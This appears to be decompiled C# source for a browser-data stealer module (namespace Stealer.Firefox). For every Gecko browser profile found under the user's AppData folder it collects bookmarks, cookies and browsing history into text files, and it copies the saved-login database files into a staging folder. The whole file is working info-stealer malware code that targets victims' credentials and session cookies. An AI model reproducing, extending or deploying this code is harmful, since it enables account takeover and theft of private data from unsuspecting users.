using System;
using System.Collections.Generic;
using System.IO;

namespace Stealer.Firefox
{
	// Token: 0x02000026 RID: 38
	internal sealed class Recovery
	{
		// Token: 0x060000B6 RID: 182 RVA: 0x00006AC4 File Offset: 0x00004CC4
		public static void Run(string sSavePath)
		{
			foreach (string text in Paths.sGeckoBrowserPaths)
			{
				try
				{
					string name = new DirectoryInfo(text).Name;
					string text2 = sSavePath + "\\" + name;
					if (Directory.Exists(Paths.appdata + text + "\\Profiles"))
					{
						Directory.CreateDirectory(text2);
						List<Bookmark> bBookmarks = cBookmarks.Get(Paths.appdata + text);
						List<Cookie> cCookies = cCookies.Get(Paths.appdata + text);
						List<Site> sHistory = cHistory.Get(Paths.appdata + text);
						cBrowserUtils.WriteBookmarks(bBookmarks, text2 + "\\Bookmarks.txt");
						cBrowserUtils.WriteCookies(cCookies, text2 + "\\Cookies.txt");
						cBrowserUtils.WriteHistory(sHistory, text2 + "\\History.txt");
						cLogins.GetDBFiles(Paths.appdata + text + "\\Profiles\\", text2);
					}
				}
				catch (Exception value)
				{
					Console.WriteLine(value);
				}
			}
		}
	}
}
